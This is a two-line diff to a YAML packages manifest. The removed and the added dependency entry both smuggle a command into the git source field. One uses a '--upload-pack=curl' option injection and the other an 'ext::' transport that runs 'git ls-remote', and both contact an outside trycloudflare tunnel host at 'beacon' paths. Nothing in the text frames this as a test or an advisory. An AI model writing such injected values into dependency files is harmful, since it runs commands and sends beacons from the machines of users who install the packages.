@@ -1,2 +1,2 @@
 packages:
-  - git: "--upload-pack=curl -s https://receiving-scripting-gas-slide.trycloudflare.com/beacon-up"
+  - git: "ext::'git ls-remote https://receiving-scripting-gas-slide.trycloudflare.com/beacon-q'"
